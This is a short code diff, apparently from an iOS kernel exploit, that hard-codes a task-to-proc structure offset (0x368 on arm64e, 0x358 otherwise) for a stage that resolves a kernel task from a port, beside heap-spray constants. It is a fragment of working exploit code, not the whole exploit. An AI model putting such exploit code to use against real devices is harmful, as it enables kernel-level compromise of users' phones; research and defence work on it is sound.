@@ -12,6 +12,17 @@ extern "C" {
 
 const uint32_t kSprayCount = 256;
 
+
+uint32_t getOffset()
+{
+#if __arm64e__
+    return 0x368;
+#else
+    return 0x358;
+#endif
+}
+
+
 // Number of spray attempts before giving up
 const uint32_t kAttempts = 20;
 
@@ -201,7 +212,7 @@ bool StageOne::GetKernelTaskFromPort(uint64_t port,
     return false;
   }
 
-  std::vector<uint64_t> task_to_pid = {OFFSET(task, bsd_info),
+  std::vector<uint64_t> task_to_pid = {getOffset(),
                                        OFFSET(proc, p_pid)};
 
   uint32_t pid;
